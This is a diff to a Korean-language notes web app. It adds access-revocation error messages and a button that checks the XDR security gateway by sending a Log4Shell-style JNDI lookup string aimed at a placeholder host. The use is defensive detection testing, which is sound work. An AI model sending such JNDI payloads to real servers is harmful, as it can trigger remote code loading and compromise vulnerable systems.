@@ -28,6 +28,9 @@
     const body = await response.json();
     if(body.error==='DEVICE_NOT_APPROVED'){approved=false;window.alephDevice.clear();$('#notes').replaceChildren();$('#workspace').hidden=true;$('#device-panel').hidden=false;$('#device-state').textContent='승인이 만료됐습니다. 다시 승인을 요청해 주세요.';}
     if (!response.ok) throw new Error(response.status === 401 ? '로그인이 만료됐습니다. 다시 로그인해 주세요.'
+      : body.error==='GRANT_REMOVED'?'이 기기의 자료실 이용 권한이 회수됐습니다. 케셰브에서 본인 접근을 복구하세요.'
+      : body.error==='DEVICE_REVOKED'?'이 기기의 자료실 접근이 철회됐습니다. 케셰브에서 본인 접근을 복구하세요.'
+      : typeof body.error==='string'&&body.error.startsWith('XDR_')?'XDR가 이 기기의 접근을 제한했습니다. 보안 기록을 확인하고 최대 15분 뒤 다시 조회하세요.'
       : response.status === 403 && ['XDR_BRUTE_FORCE','XDR_WEB_INJECTION'].includes(body.error) ? '반복 공격 신호로 접근이 잠시 제한됐습니다. 최대 15분 뒤 다시 시도해 주세요.'
       : response.status === 404 ? '메모를 찾을 수 없습니다. 목록을 새로고침해 주세요.'
       : response.status === 409 ? '같은 메모 ID가 이미 있습니다.'
@@ -159,6 +162,20 @@
       }catch(e){status(e.message);}finally{verifyDirect.disabled=false;}
     });
     $('#refresh').after(verifyDirect);
+    const verifyXdr=document.createElement('button');verifyXdr.type='button';verifyXdr.textContent='XDR 차단 검증 · 이 기기 15분 격리';
+    verifyXdr.addEventListener('click',async()=>{
+      verifyXdr.disabled=true;
+      try{
+        const {data}=await currentSession();if(!approved||!data.session)throw Error('로그인과 기기 승인을 먼저 완료하세요.');
+        // Literal syntax only: the gateway classifies it; no lookup or exploit runs.
+        const target='/api/my/notes?id='+encodeURIComponent('${jndi:ldap://example.invalid/verification-only}');
+        const headers={authorization:'Bearer '+data.session.access_token,...await window.alephDevice.headers(data.session,target,{})};
+        const r=await fetch('/api/netbird/verify-xdr',{method:'POST',headers:{'content-type':'application/json'},body:JSON.stringify({headers})}),d=await r.json();
+        if(!r.ok||!d.ok)throw Error('실제 XDR 거부를 확인하지 못했습니다.');
+        $('#notes').replaceChildren();$('#workspace').hidden=true;$('#device-panel').hidden=false;$('#retry-notes')?.removeAttribute('hidden');
+        status(`XDR 검사: HTTP ${d.data.status}, ${d.data.code}. ${d.data.passed?'기존 known-cve 판단기가 이 기기의 자료 접근을 15분 차단했습니다. 만료 후 다시 조회하세요.':'차단 조건을 충족하지 못했습니다.'}`);
+      }catch(e){status(e.message);}finally{verifyXdr.disabled=false;}
+    });$('#refresh').after(verifyXdr);
     const row=document.createElement('div');row.className='actions';
     const tokenLabel=document.createElement('label');tokenLabel.textContent='메일 확인 코드';
     const tokenInput=document.createElement('input');tokenInput.type='password';tokenInput.autocomplete='one-time-code';tokenInput.id='mail-confirm-token';tokenLabel.htmlFor=tokenInput.id;row.append(tokenLabel,tokenInput);
